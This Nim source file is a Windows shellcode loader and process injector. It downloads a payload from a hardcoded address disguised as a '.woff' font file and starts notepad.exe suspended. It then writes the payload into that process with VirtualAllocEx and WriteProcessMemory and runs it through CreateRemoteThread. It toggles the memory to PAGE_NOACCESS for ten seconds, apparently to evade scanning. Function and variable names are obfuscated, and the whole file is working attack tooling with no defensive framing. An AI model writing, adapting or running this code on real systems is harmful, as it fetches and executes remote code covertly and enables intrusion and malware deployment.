import winim/lean
import osproc
import os
import httpclient

proc a1(url: string): seq[byte] =
    let b1 = newHttpClient()
    defer: b1.close()

    echo "[*] Fetching data from: ", url
    let r1 = b1.get(url)  
    if r1.code != Http200:
        raise newException(ValueError, "Shellcode download failed. HTTP Code: " & $r1.code)
    echo "[*] Shellcode download complete."

    result = cast[seq[byte]](r1.body)

proc b2(c1: seq[byte]): void =
    var d1: DWORD
    let e1 = startProcess("notepad.exe")
    e1.suspend()
    defer: e1.close()

    echo "[*] Suspended process ID: ", e1.processID

    let f1 = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](e1.processID)
    )
    defer: CloseHandle(f1)

    echo "[*] Handle: ", f1

    let g1 = VirtualAllocEx(
        f1,
        NULL,
        cast[SIZE_T](c1.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var h1: SIZE_T
    let i1 = WriteProcessMemory(
        f1, 
        g1,
        unsafeAddr c1[0],  
        cast[SIZE_T](c1.len),
        addr h1
    )

    echo "[*] WriteProcessMemory success: ", bool(i1)
    echo "    \\-- bytes written: ", h1
    echo ""
    VirtualProtect(cast[LPVOID](g1), c1.len, PAGE_NOACCESS, addr d1)
    let j1 = CreateRemoteThread(
        f1, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](g1),
        NULL, 
        0x00000004, 
        NULL
    )
    sleep(10000)
    VirtualProtect(cast[LPVOID](g1), c1.len, PAGE_EXECUTE_READ_WRITE, addr d1)
    ResumeThread(j1)
    echo "[*] Remote thread handle: ", j1
    echo "[+] Shellcode injected."

when defined(windows):
    when isMainModule:
        let k1 = "http://192.168.8.104:1234/shellcode.woff"
        let l1 = a1(k1)
        b2(l1)
